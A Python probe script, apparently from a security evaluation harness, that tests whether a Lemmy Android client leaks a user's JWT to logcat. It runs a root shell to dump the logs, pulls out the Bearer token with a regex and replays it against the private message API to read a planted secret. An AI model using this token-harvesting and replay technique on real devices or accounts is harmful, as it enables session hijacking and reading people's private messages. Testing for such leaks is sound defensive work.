#!/usr/bin/env python3
"""
Probe: Jerboa — confidentiality (remote_attacker).
Isolated entry point for consolidated evaluation engine.
"""

from __future__ import annotations

import json
import os
import re
import sys
from pathlib import Path


def _load_and_run():
    parent = Path(__file__).resolve().parent.parent
    if str(parent) not in sys.path:
        sys.path.insert(0, str(parent))

    from jerboa_probe_utils import (
        get_victim_jwt_from_db,
        run_root_shell,
    )

    impact, summary = False, {"score": 1, "vectors": {}}
    victim_jwt = get_victim_jwt_from_db()
    if not victim_jwt:
        print(json.dumps(summary))
        return 1

    expected_secret = json.loads((parent / "secrets.json").read_text()).get(
        "alice_dm_secret", ""
    )

    # V-002: Root-readable logcat leak with post-exploit API access
    success, log_output = run_root_shell("logcat -d -v threadtime -s LemmyAPI:V")
    if success and victim_jwt in log_output:
        jwt_match = re.search(r"Bearer\s+([A-Za-z0-9._\-]+)", log_output)
        if jwt_match:
            try:
                import requests

                base_url = os.getenv("LEMMY_URL", "https://localhost:8536")
                response = requests.get(
                    f"{base_url}/api/v3/private_message/list",
                    params={"type_": "All", "limit": 20},
                    headers={"Authorization": f"Bearer {jwt_match.group(1)}"},
                    timeout=10,
                )
                if response.status_code == 200:
                    payload = response.json()
                    for pm in payload.get("private_messages", []):
                        message = pm.get("private_message", {}).get("content", "")
                        if expected_secret and expected_secret in message:
                            impact = summary["vectors"]["V-002"] = True
                            break
            except Exception:
                pass

    summary["score"] = 0 if impact else 1
    print(json.dumps(summary))
    return 0 if impact else 1


if __name__ == "__main__":
    sys.exit(_load_and_run())
